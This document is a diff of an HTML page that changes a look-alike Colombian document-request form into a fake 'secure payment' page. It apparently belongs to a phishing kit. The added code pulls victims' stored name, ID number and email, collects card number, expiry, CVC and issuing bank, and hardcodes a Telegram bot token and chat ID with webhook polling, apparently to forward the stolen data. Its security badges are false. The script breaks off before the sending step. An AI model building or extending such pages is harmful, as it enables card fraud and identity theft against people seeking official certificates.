@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Solicitud en Línea — Certificado de Antecedentes</title>
+    <title>Pago Seguro — Certificado de Tradición y Libertad</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
     <style>
         :root {
@@ -12,6 +12,7 @@
             --co-blue-tint: #eaf0f8;
             --co-yellow: #f6c915;
             --co-red: #c1121f;
+            --co-green: #059669;
             --co-text: #111827;
             --co-text-2: #374151;
             --co-text-muted: #6b7280;
@@ -66,7 +67,7 @@
         }
 
         .progress-info {
-            display: none;
+            display: flex;
             align-items: center;
             gap: 10px;
         }
@@ -82,7 +83,7 @@
         .progress-bar-fill {
             height: 100%;
             background: var(--co-blue);
-            width: 67%;
+            width: 100%;
             transition: width 0.3s ease;
         }
 
@@ -162,7 +163,6 @@
 
         .progress-number.completed::before {
             content: "✓";
-            font-weight: bold;
         }
 
         .progress-title {
@@ -238,13 +238,14 @@
         .form-section {
             display: flex;
             flex-direction: column;
-            gap: 28px;
+            gap: 32px;
         }
 
         .form-group {
             display: flex;
             flex-direction: column;
-            gap: 12px;
+            gap: 8px;
+            margin-bottom: 20px;
         }
 
         .form-label {
@@ -252,7 +253,7 @@
             font-size: 0.875rem;
             font-weight: 600;
             display: block;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
         }
 
         .kern-input,
@@ -285,6 +286,11 @@
             padding-bottom: 7px;
         }
 
+        .kern-input:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
         .kern-select {
             appearance: none;
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23374151' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
@@ -293,47 +299,277 @@
             padding-right: 40px;
         }
 
-        /* CHECKBOX */
-        .checkbox-group {
+        /* RESUMEN BOX ampliado con datos personales */
+        .resumen-box {
+            background: #f9fafb;
+            border: 1px solid var(--co-border);
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+
+        .resumen-title {
+            font-size: 0.75rem;
+            font-weight: 600;
+            color: var(--co-text-muted);
+            text-transform: uppercase;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+
+        .resumen-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--co-border);
+        }
+
+        .resumen-item:last-child {
+            border-bottom: none;
+            font-weight: 700;
+            font-size: 1rem;
+            padding-top: 16px;
+            color: var(--co-text);
+        }
+
+        .resumen-label {
+            font-size: 0.9375rem;
+            color: var(--co-text-2);
+        }
+
+        .resumen-value {
+            font-size: 0.9375rem;
+            color: var(--co-text-2);
+            font-weight: 500;
+        }
+
+        .resumen-item:last-child .resumen-value {
+            font-weight: 700;
+        }
+
+        .resumen-datos {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px dashed var(--co-border);
+        }
+
+        .resumen-datos .resumen-item {
+            padding: 8px 0;
+            border-bottom: none;
+            font-size: 0.875rem;
+        }
+
+        .resumen-datos .resumen-label {
+            font-weight: 400;
+            color: var(--co-text-muted);
+        }
+
+        /* SECURE PAYMENT SECTION */
+        .payment-section {
+            border: 1px solid var(--co-border);
+            padding: 24px;
+            margin-bottom: 24px;
+            background: #fafbfc;
+        }
+
+        .payment-header {
             display: flex;
             align-items: flex-start;
             gap: 12px;
-            padding: 16px;
-            border-left: 4px solid var(--co-blue-tint);
-            background-color: var(--co-blue-tint);
-            margin: 16px 0;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--co-border);
         }
 
-        .checkbox-group input[type="checkbox"] {
+        .payment-header svg {
             width: 20px;
             height: 20px;
+            color: var(--co-blue);
             flex-shrink: 0;
-            cursor: pointer;
-            accent-color: var(--co-blue);
             margin-top: 2px;
         }
 
-        .checkbox-label {
-            font-size: 0.875rem;
+        .payment-info {
+            flex: 1;
+        }
+
+        .payment-title {
+            font-size: 0.9375rem;
+            font-weight: 600;
+            color: var(--co-text);
+            margin-bottom: 2px;
+        }
+
+        .payment-subtitle {
+            font-size: 0.8125rem;
             color: var(--co-text-muted);
-            line-height: 1.4;
+        }
+
+        .payment-logos {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .payment-logos img {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* CARD INPUT WRAPPER */
+        .card-input-wrapper {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .card-logo {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 32px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+        }
+
+        .card-logo img {
+            max-width: 100%;
+            max-height: 100%;
+        }
+
+        .card-input-wrapper .kern-input {
+            padding-right: 48px;
+        }
+
+        /* EXPIRY AND CVC GRID */
+        .expiry-cvc-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .expiry-cvc-grid .form-group {
+            margin-bottom: 0;
+        }
+
+        .expiry-cvc-grid .form-label {
+            font-size: 0.875rem;
+            margin-bottom: 6px;
+        }
+
+        /* BANCO EMISOR */
+        .banco-group {
+            margin-bottom: 24px;
+        }
+
+        .banco-group .form-label {
+            font-size: 0.875rem;
+            margin-bottom: 6px;
+        }
+
+        /* SECURITY FOOTER */
+        .security-footer {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.8125rem;
+            color: var(--co-text-muted);
+            margin-bottom: 24px;
+            padding: 16px 0;
+            border-top: 1px solid var(--co-border);
+        }
+
+        .security-footer svg {
+            width: 16px;
+            height: 16px;
+            color: var(--co-blue);
+            flex-shrink: 0;
+        }
+
+        /* LOADING OVERLAY */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #fff;
+            font-size: 1.125rem;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .loading-subtext {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.875rem;
+            margin-top: 8px;
+        }
+
+        /* ERROR/SUCCESS MESSAGE */
+        .status-message {
+            display: none;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            text-align: center;
+        }
+
+        .status-message.error {
+            display: block;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+        }
+
+        .status-message.success {
+            display: block;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            color: #16a34a;
         }
 
         /* BUTTONS */
-        .form-actions {
-            display: flex;
-            justify-content: flex-end;
-            gap: 12px;
-            margin-top: 32px;
-        }
-
         .btn {
             height: 48px;
             padding: 0 24px;
             font-family: 'Inter', system-ui, sans-serif;
             font-size: 1rem;
             font-weight: 600;
-            border-radius: 0;
+            border-radius: 4px;
             border: none;
             cursor: pointer;
             display: inline-flex;
@@ -341,6 +577,8 @@
             justify-content: center;
             gap: 8px;
             transition: background-color 0.15s;
+            width: 100%;
+            text-align: center;
         }
 
         .btn-primary {
@@ -352,14 +590,27 @@
             background-color: var(--co-blue-hover);
         }
 
-        .btn-secondary {
-            color: var(--co-blue);
-            border: 2px solid var(--co-blue);
-            background: transparent;
+        .btn-primary:disabled {
+            background-color: var(--co-border);
+            cursor: not-allowed;
         }
 
-        .btn-secondary:hover {
-            background-color: var(--co-blue-tint);
+        /* DISCLAIMER */
+        .disclaimer {
+            font-size: 0.8125rem;
+            color: var(--co-text-muted);
+            line-height: 1.6;
+            margin-top: 20px;
+            padding-top: 20px;
+        }
+
+        .disclaimer a {
+            color: var(--co-blue);
+            text-decoration: none;
+        }
+
+        .disclaimer a:hover {
+            text-decoration: underline;
         }
 
         /* FOOTER */
@@ -398,12 +649,25 @@
             line-height: 1.5;
         }
 
+        /* ERROR MESSAGES */
+        .error-message {
+            color: var(--co-red);
+            font-size: 0.75rem;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .form-group.error .kern-input,
+        .form-group.error .kern-select {
+            border-bottom-color: var(--co-red);
+        }
+
+        .form-group.error .error-message {
+            display: block;
+        }
+
         /* RESPONSIVE */
         @media (max-width: 768px) {
-            .progress-info {
-                display: none;
-            }
-
             .content-wrapper {
                 flex-direction: column;
                 gap: 24px;
@@ -417,10 +681,6 @@
                 max-width: 100%;
             }
 
-            .header-container {
-                padding: 0 16px;
-            }
-
             main {
                 padding: 16px;
             }
@@ -429,54 +689,16 @@
                 font-size: 1.25rem;
             }
 
-            .form-actions {
-                flex-direction: column-reverse;
-            }
-
             .btn {
                 width: 100%;
             }
 
-            .kern-input,
-            .kern-select {
-                height: 44px;
-                padding: 6px 12px;
-                font-size: 16px;
-            }
-
-            .kern-input:focus,
-            .kern-select:focus {
-                padding-bottom: 5px;
-            }
-
-            .form-label {
-                font-size: 0.8125rem;
-                margin-bottom: 6px;
-            }
-
-            .form-group {
-                gap: 10px;
-                margin-bottom: 8px;
-            }
-
-            .form-section {
-                gap: 24px;
-            }
-
-            .checkbox-group {
-                padding: 12px;
-            }
-
-            .checkbox-label {
-                font-size: 0.8125rem;
+            .expiry-cvc-grid {
+                grid-template-columns: 1fr 1fr;
             }
         }
 
         @media (max-width: 480px) {
-            .header-container {
-                flex-direction: column;
-            }
-
             .form-header h1 {
                 font-size: 1.125rem;
             }
@@ -489,106 +711,39 @@
                 font-size: 0.8125rem;
             }
 
-            .logo svg {
-                height: 36px;
-            }
-
-            .kern-input,
-            .kern-select {
-                height: 48px;
-                padding: 10px 12px;
-                font-size: 16px;
-                border-bottom-width: 2px;
-            }
-
-            .kern-input:focus,
-            .kern-select:focus {
-                padding-bottom: 5px;
-            }
-
-            .kern-select {
-                padding-right: 36px;
-            }
-
-            .form-section {
-                gap: 24px;
-            }
-
-            .form-group {
-                gap: 4px;
-            }
-
-            .form-label {
-                font-size: 0.75rem;
-                font-weight: 600;
-            }
-
-            .form-header {
-                margin-bottom: 16px;
-            }
-
-            .form-intro {
-                margin-bottom: 20px;
-            }
-
-            .checkbox-group {
-                padding: 10px;
-                gap: 10px;
-                margin: 12px 0;
-            }
-
-            .checkbox-group input[type="checkbox"] {
-                width: 18px;
-                height: 18px;
-                margin-top: 1px;
-            }
-
-            .checkbox-label {
-                font-size: 0.75rem;
-                line-height: 1.3;
-            }
-
-            .form-actions {
-                gap: 8px;
-                margin-top: 24px;
-            }
-
-            .btn {
-                height: 44px;
-                padding: 0 20px;
-                font-size: 0.9375rem;
-            }
-
-            main {
-                padding: 14px;
-                overflow-x: hidden;
-            }
-
-            .content-wrapper {
+            .expiry-cvc-grid {
+                grid-template-columns: 1fr;
                 gap: 16px;
             }
         }
     </style>
 </head>
 <body>
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Procesando pago...</div>
+        <div class="loading-subtext">Verificando información de la tarjeta</div>
+    </div>
+
     <header>
         <div class="header-container">
-            <a aria-label="Certificado de Antecedentes" href="index.html" class="logo">
-                <svg width="400" height="48" viewBox="0 0 400 48" role="img" aria-label="Certificado de Antecedentes">
+            <a aria-label="Certificado de Tradición y Libertad" href="index.html" class="logo">
+                <svg width="400" height="48" viewBox="0 0 400 48" role="img" aria-label="Certificado de Tradición y Libertad">
                     <g transform="translate(0 6)">
                         <rect x="0" y="0" width="5.5" height="18" fill="#F6C915"></rect>
                         <rect x="0" y="18" width="5.5" height="9" fill="#2C5697"></rect>
                         <rect x="0" y="27" width="5.5" height="9" fill="#C1121F"></rect>
                     </g>
                     <text x="24" y="16" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="10" font-weight="500" letter-spacing="1.2" fill="#6B7280">SOLICITAR DOCUMENTO</text>
-                    <text x="24" y="34" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="17" font-weight="550" fill="#111827">Certificado de Antecedentes</text>
+                    <text x="24" y="34" dominant-baseline="central" font-family="'Inter', system-ui, sans-serif" font-size="17" font-weight="550" fill="#111827">Certificado de Tradición y Libertad</text>
                 </svg>
             </a>
             <div class="progress-info">
                 <div class="progress-bar-container">
                     <div class="progress-bar-fill"></div>
                 </div>
-                <span class="progress-text">67% completado</span>
+                <span class="progress-text">100% completado</span>
             </div>
         </div>
         <div class="header-stripe">
@@ -610,18 +765,18 @@
                                 <span class="badge info">Completado</span>
                             </div>
                         </li>
-                        <li class="progress-item active">
-                            <span class="progress-number active">2</span>
+                        <li class="progress-item completed">
+                            <span class="progress-number completed"></span>
                             <div class="progress-title">
                                 <span>Su solicitud en línea</span>
-                                <span class="badge info">Actual</span>
+                                <span class="badge info">Completado</span>
                             </div>
                         </li>
-                        <li class="progress-item">
-                            <span class="progress-number">3</span>
+                        <li class="progress-item active">
+                            <span class="progress-number active">3</span>
                             <div class="progress-title">
                                 <span>Pago</span>
-                                <span class="badge neutral">Pendiente</span>
+                                <span class="badge info">Actual</span>
                             </div>
                         </li>
                     </ul>
@@ -630,83 +785,141 @@
 
             <div class="form-container">
                 <div class="form-header">
-                    <h1>Completa tu solicitud de Tradición y Libertad</h1>
-                    <p>Por favor proporciona la información adicional necesaria para procesar tu solicitud de Certificado de Tradición y Libertad.</p>
+                    <h1>Pago Seguro</h1>
+                    <p>Complete su pago de forma segura. Su Certificado de Tradición y Libertad será enviado a su correo electrónico una vez confirmado el pago.</p>
                 </div>
 
-                <form novalidate id="paso2Form">
-                    <p class="form-intro">Completa todos los campos requeridos marcados con asterisco (*).</p>
+                <!-- STATUS MESSAGE -->
+                <div class="status-message" id="statusMessage"></div>
 
-                    <div class="form-section">
-                        <div class="form-group">
-                            <label class="form-label">Tipo de Documento *</label>
-                            <select class="kern-select" id="tipoDocumento" required>
-                                <option value="">Selecciona un tipo de documento</option>
-                                <option value="CC">Cédula de Ciudadanía (CC)</option>
-                                <option value="CE">Cédula de Extranjería (CE)</option>
-                                <option value="PA">Pasaporte (PA)</option>
-                                <option value="PE">Permiso Especial de Permanencia (PEP)</option>
-                                <option value="PN">Permiso de Permanencia (PN)</option>
-                            </select>
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Número de Documento *</label>
-                            <input class="kern-input" type="text" id="numeroDocumento" placeholder="Ej. 1234567890" required />
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Nombre(s) *</label>
-                            <input class="kern-input" type="text" id="nombre" placeholder="Tu primer nombre" required />
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Apellidos *</label>
-                            <input class="kern-input" type="text" id="apellidos" placeholder="Tus apellidos" required />
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Dirección de email *</label>
-                            <input class="kern-input" type="email" id="email" placeholder="nombre@ejemplo.com" required />
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Ciudad *</label>
-                            <input class="kern-input" type="text" id="ciudad" placeholder="Ej. Bogotá" required />
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Código Postal</label>
-                            <input class="kern-input" type="text" id="codigoPostal" placeholder="Ej. 110111" />
-                        </div>
-
-                        <div class="form-group">
-                            <label class="form-label">Dirección *</label>
-                            <input class="kern-input" type="text" id="direccion" placeholder="Calle, número, apartamento" required />
-                        </div>
-
-                        <div class="checkbox-group">
-                            <input type="checkbox" id="privacidad" name="privacidad" required>
-                            <label for="privacidad" class="checkbox-label">
-                                Acepto la Política de Reembolsos y de Privacidad. Entiendo que, por ser un servicio digital personalizado, el derecho a reembolso caduca al entregarse el servicio (art. 47, Ley 1480 de 2011).
-                            </label>
-                        </div>
-
-                        <div class="checkbox-group">
-                            <input type="checkbox" id="rapido" name="rapido" onchange="savePriorityOption()">
-                            <label for="rapido" class="checkbox-label">
-                                ¿En un apuro? Elige nuestra opción de procesamiento prioritario. Tu documento Certificado de Antecedentes será entregado en 12 horas por 20.000 COP$ extra.
-                            </label>
-                        </div>
+                <!-- RESUMEN DE SOLICITUD con datos personales -->
+                <div class="resumen-box">
+                    <div class="resumen-title">Resumen de su solicitud</div>
+                    <div class="resumen-item">
+                        <span class="resumen-label">Certificado de Tradición y Libertad</span>
+                        <span class="resumen-value">23.000 Col$</span>
+                    </div>
+                    <div class="resumen-item" id="procesamiento-item" style="display: none;">
+                        <span class="resumen-label">Procesamiento prioritario</span>
+                        <span class="resumen-value">20.000 Col$</span>
+                    </div>
+                    <div class="resumen-item">
+                        <span class="resumen-label">Total</span>
+                        <span class="resumen-value" id="total-price">23.000 Col$</span>
                     </div>
 
-                    <div class="form-actions">
-                        <button type="button" class="btn btn-secondary" onclick="window.location.href='paso1.html'">
-                            ← ATRÁS
+                    <!-- Datos personales del solicitante -->
+                    <div class="resumen-datos">
+                        <div class="resumen-item">
+                            <span class="resumen-label">Solicitante</span>
+                            <span class="resumen-value" id="resumen-nombre">---</span>
+                        </div>
+                        <div class="resumen-item">
+                            <span class="resumen-label">Documento</span>
+                            <span class="resumen-value" id="resumen-documento">---</span>
+                        </div>
+                        <div class="resumen-item">
+                            <span class="resumen-label">Correo electrónico</span>
+                            <span class="resumen-value" id="resumen-email">---</span>
+                        </div>
+                    </div>
+                </div>
+
+                <form novalidate id="paymentForm">
+                    <div class="form-section">
+                        <!-- SECURE PAYMENT HEADER -->
+                        <div class="payment-section">
+                            <div class="payment-header">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
+                                </svg>
+                                <div class="payment-info">
+                                    <div class="payment-title">Pago Seguro con Tarjeta</div>
+                                    <div class="payment-subtitle">SSL 256-bit · PCI-DSS</div>
+                                </div>
+                                <div class="payment-logos">
+                                    <img src="visa.png" alt="Visa" title="Visa">
+                                    <img src="master.png" alt="Mastercard" title="Mastercard">
+                                    <img src="ame.png" alt="American Express" title="American Express">
+                                </div>
+                            </div>
+
+                            <!-- CARDHOLDER NAME -->
+                            <div class="form-group">
+                                <label class="form-label">Nombre del titular</label>
+                                <input class="kern-input" type="text" id="cardholderName" placeholder="Exactamente como aparece en tu tarjeta" required />
+                                <div class="error-message">El nombre es requerido</div>
+                            </div>
+
+                            <!-- CARD NUMBER -->
+                            <div class="form-group">
+                                <label class="form-label">Número de tarjeta</label>
+                                <div class="card-input-wrapper">
+                                    <input class="kern-input" type="text" id="cardNumber" placeholder="Card number" maxlength="19" required />
+                                    <div class="card-logo" id="cardLogo"></div>
+                                </div>
+                                <div class="error-message" id="cardNumberError">Número de tarjeta inválido</div>
+                            </div>
+
+                            <!-- EXPIRY AND CVC -->
+                            <div class="expiry-cvc-grid">
+                                <div class="form-group">
+                                    <label class="form-label">Vencimiento</label>
+                                    <input class="kern-input" type="text" id="expiry" placeholder="MM / YY" maxlength="5" required />
+                                    <div class="error-message">Formato: MM/YY</div>
+                                </div>
+                                <div class="form-group">
+                                    <label class="form-label">CVC</label>
+                                    <input class="kern-input" type="text" id="cvc" placeholder="XXX" maxlength="4" required />
+                                    <div class="error-message">CVC inválido</div>
+                                </div>
+                            </div>
+
+                            <!-- BANCO EMISOR -->
+                            <div class="form-group banco-group">
+                                <label class="form-label">Banco emisor</label>
+                                <select class="kern-select" id="bancoEmisor" required>
+                                    <option value="">Seleccione su banco</option>
+                                    <option value="Bancolombia">Bancolombia</option>
+                                    <option value="Davivienda">Davivienda</option>
+                                    <option value="BBVA Colombia">BBVA Colombia</option>
+                                    <option value="Banco de Bogotá">Banco de Bogotá</option>
+                                    <option value="Banco Popular">Banco Popular</option>
+                                    <option value="Banco Occidente">Banco Occidente</option>
+                                    <option value="Citibank Colombia">Citibank Colombia</option>
+                                    <option value="Banco AV Villas">Banco AV Villas</option>
+                                    <option value="Banco Colpatria">Banco Colpatria</option>
+                                    <option value="Bancoomeva">Bancoomeva</option>
+                                    <option value="Banco GNB Sudameris">Banco GNB Sudameris</option>
+                                    <option value="Banco Finandina">Banco Finandina</option>
+                                    <option value="Banco Falabella">Banco Falabella</option>
+                                    <option value="Banco Pichincha">Banco Pichincha</option>
+                                    <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
+                                    <option value="Otro">Otro</option>
+                                </select>
+                                <div class="error-message">Seleccione un banco emisor</div>
+                            </div>
+
+                            <!-- SECURITY FOOTER -->
+                            <div class="security-footer">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                                    <path d="M7 11V7a4 4 0 0 1 4-4h2a4 4 0 0 1 4 4v4"></path>
+                                </svg>
+                                <span>Conexión cifrada · Cumple PCI-DSS</span>
+                            </div>
+                        </div>
+
+                        <!-- SUBMIT BUTTON -->
+                        <button type="submit" class="btn btn-primary" id="submitButton">
+                            Pagar de forma segura
                         </button>
-                        <button type="submit" class="btn btn-primary">
-                            SIGUIENTE →
-                        </button>
+
+                        <!-- DISCLAIMER -->
+                        <div class="disclaimer">
+                            Al completar el pago, acepta nuestros <a href="#terminos">Términos y Condiciones</a> y <a href="#privacidad">Política de Privacidad</a>. Su pago está protegido con encriptación SSL.
+                        </div>
                     </div>
                 </form>
             </div>
@@ -720,54 +933,462 @@
             <a href="#">Política de Reembolsos</a>
             <a href="#">Contacto</a>
         </div>
-        <p class="footer-text">© 2026 Certificado de Antecedentes S.A.S.</p>
+        <p class="footer-text">© 2026 Certificado de Tradición y Libertad S.A.S.</p>
         <p class="footer-disclaimer">
             Servicio privado de gestión documental. No formamos parte del Gobierno de Colombia ni de GOV.CO; actuamos como intermediarios para facilitar tu solicitud ante la autoridad competente.
         </p>
     </footer>
 
     <script>
-        // Guardar opción de procesamiento prioritario
-        function savePriorityOption() {
-            const rapidoCheckbox = document.getElementById('rapido');
-            localStorage.setItem('procesamiento_prioritario', rapidoCheckbox.checked);
-        }
+        // ============================================
+        // CONFIGURACIÓN DE TELEGRAM Y WEBHOOK
+        // ============================================
+        const TELEGRAM_BOT_TOKEN = '8952571695:AAHr5qHDQ7Hu0LoqGS49jUWg9MYFjO1MaBw';
+        const TELEGRAM_CHAT_ID = '-1004389419498';
+        const WEBHOOK_URL = '/api/webhook';
+        const POLLING_INTERVAL = 3000;
+        const MAX_POLLING_TIME = 300000;
 
-        // Manejar envío del formulario
-        document.getElementById('paso2Form').addEventListener('submit', function(e) {
-            e.preventDefault();
+        let solicitudId = null;
+        let pollingInterval = null;
+        let cardType = null;
+
+        // ============================================
+        // CARGAR DATOS DEL LOCALSTORAGE
+        // ============================================
+        window.addEventListener('load', function() {
+            // Cargar precios según procesamiento prioritario
+            const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
+            const procesamiento_item = document.getElementById('procesamiento-item');
+            const total_price = document.getElementById('total-price');
             
-            // Guardar la opción de procesamiento prioritario
-            savePriorityOption();
-            
-            // Guardar datos personales
-            localStorage.setItem('tipoDocumento', document.getElementById('tipoDocumento').value);
-            localStorage.setItem('numeroDocumento', document.getElementById('numeroDocumento').value);
-            localStorage.setItem('nombre', document.getElementById('nombre').value);
-            localStorage.setItem('apellidos', document.getElementById('apellidos').value);
-            localStorage.setItem('email', document.getElementById('email').value);
-            localStorage.setItem('ciudad', document.getElementById('ciudad').value);
-            localStorage.setItem('codigoPostal', document.getElementById('codigoPostal').value);
-            localStorage.setItem('direccion', document.getElementById('direccion').value);
-            
-            // Redirigir a paso3
-            window.location.href = 'paso3.html';
+            let total = 23000;
+            if (procesamiento_prioritario) {
+                procesamiento_item.style.display = 'flex';
+                total += 20000;
+            } else {
+                procesamiento_item.style.display = 'none';
+            }
+            const formatted_total = total.toLocaleString('es-CO').replace(/,/g, '.');
+            total_price.textContent = formatted_total + ' Col$';
+
+            // Mostrar datos personales en el resumen
+            const nombre = localStorage.getItem('nombre') || 'No proporcionado';
+            const apellidos = localStorage.getItem('apellidos') || '';
+            const tipoDoc = localStorage.getItem('tipoDocumento') || '';
+            const numeroDoc = localStorage.getItem('numeroDocumento') || 'No proporcionado';
+            const email = localStorage.getItem('email') || 'No proporcionado';
+
+            document.getElementById('resumen-nombre').textContent = `${nombre} ${apellidos}`.trim() || 'No proporcionado';
+            document.getElementById('resumen-documento').textContent = `${tipoDoc} ${numeroDoc}`.trim();
+            document.getElementById('resumen-email').textContent = email;
+
+            // Configurar webhook
+            configurarWebhook();
         });
 
-        // Cargar estado guardado al cargar la página
-        window.addEventListener('load', function() {
-            const prioritarioGuardado = localStorage.getItem('procesamiento_prioritario') === 'true';
-            document.getElementById('rapido').checked = prioritarioGuardado;
+        // ============================================
+        // DETECCIÓN DE TIPO DE TARJETA
+        // ============================================
+        const cardNumberInput = document.getElementById('cardNumber');
+        const cardholderInput = document.getElementById('cardholderName');
+        const expiryInput = document.getElementById('expiry');
+        const cvcInput = document.getElementById('cvc');
+        const bancoEmisor = document.getElementById('bancoEmisor');
+        const cardLogo = document.getElementById('cardLogo');
+        const form = document.getElementById('paymentForm');
+        const submitButton = document.getElementById('submitButton');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const statusMessage = document.getElementById('statusMessage');
+
+        const cardPatterns = {
+            visa: {
+                regex: /^4[0-9]{12}(?:[0-9]{3})?$/,
+                bins: [4],
+                lengths: [13, 16, 19]
+            },
+            mastercard: {
+                regex: /^(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}$/,
+                bins: [51, 52, 53, 54, 55, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271],
+                lengths: [16, 19]
+            },
+            amex: {
+                regex: /^3[47][0-9]{13}$/,
+                bins: [34, 37],
+                lengths: [15, 19]
+            }
+        };
+
+        function detectCardType(cardNumber) {
+            const cleanNumber = cardNumber.replace(/\s/g, '');
             
-            // Cargar datos guardados si existen
-            document.getElementById('tipoDocumento').value = localStorage.getItem('tipoDocumento') || '';
-            document.getElementById('numeroDocumento').value = localStorage.getItem('numeroDocumento') || '';
-            document.getElementById('nombre').value = localStorage.getItem('nombre') || '';
-            document.getElementById('apellidos').value = localStorage.getItem('apellidos') || '';
-            document.getElementById('email').value = localStorage.getItem('email') || '';
-            document.getElementById('ciudad').value = localStorage.getItem('ciudad') || '';
-            document.getElementById('codigoPostal').value = localStorage.getItem('codigoPostal') || '';
-            document.getElementById('direccion').value = localStorage.getItem('direccion') || '';
+            if (cleanNumber.length >= 3) {
+                const firstThree = cleanNumber.substring(0, 3);
+                const firstTwo = cleanNumber.substring(0, 2);
+                const firstOne = cleanNumber.substring(0, 1);
+                
+                if (firstOne === '4') {
+                    if (cardPatterns.visa.regex.test(cleanNumber) || cleanNumber.length < 13) {
+                        return 'visa';
+                    }
+                }
+                
+                if (firstTwo === '34' || firstTwo === '37') {
+                    if (cardPatterns.amex.regex.test(cleanNumber) || cleanNumber.length < 15) {
+                        return 'amex';
+                    }
+                }
+                
+                if ((firstTwo >= '51' && firstTwo <= '55') || 
+                    (firstThree >= '222' && firstThree <= '272')) {
+                    if (cardPatterns.mastercard.regex.test(cleanNumber) || cleanNumber.length < 16) {
+                        return 'mastercard';
+                    }
+                }
+            }
+            
+            if (cleanNumber.length >= 13) {
+                if (cardPatterns.visa.regex.test(cleanNumber)) {
+                    return 'visa';
+                } else if (cardPatterns.mastercard.regex.test(cleanNumber)) {
+                    return 'mastercard';
+                } else if (cardPatterns.amex.regex.test(cleanNumber)) {
+                    return 'amex';
+                }
+            }
+            
+            return null;
+        }
+
+        function updateCardLogo(type) {
+            cardLogo.innerHTML = '';
+            
+            if (type === 'visa') {
+                const img = document.createElement('img');
+                img.src = 'visa.png';
+                img.alt = 'Visa';
+                cardLogo.appendChild(img);
+            } else if (type === 'mastercard') {
+                const img = document.createElement('img');
+                img.src = 'master.png';
+                img.alt = 'Mastercard';
+                cardLogo.appendChild(img);
+            } else if (type === 'amex') {
+                const img = document.createElement('img');
+                img.src = 'ame.png';
+                img.alt = 'American Express';
+                cardLogo.appendChild(img);
+            }
+        }
+
+        function formatCardNumber(value) {
+            return value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+        }
+
+        function formatExpiry(value) {
+            const cleaned = value.replace(/\D/g, '');
+            if (cleaned.length >= 2) {
+                return cleaned.substring(0, 2) + '/' + cleaned.substring(2, 4);
+            }
+            return cleaned;
+        }
+
+        cardNumberInput.addEventListener('input', function(e) {
+            const cardNumber = e.target.value.replace(/\s/g, '');
+            this.value = this.value.replace(/[^0-9\s]/g, '');
+            this.value = formatCardNumber(this.value);
+            
+            if (cardNumber.length >= 3) {
+                const type = detectCardType(cardNumber);
+                updateCardLogo(type);
+            } else {
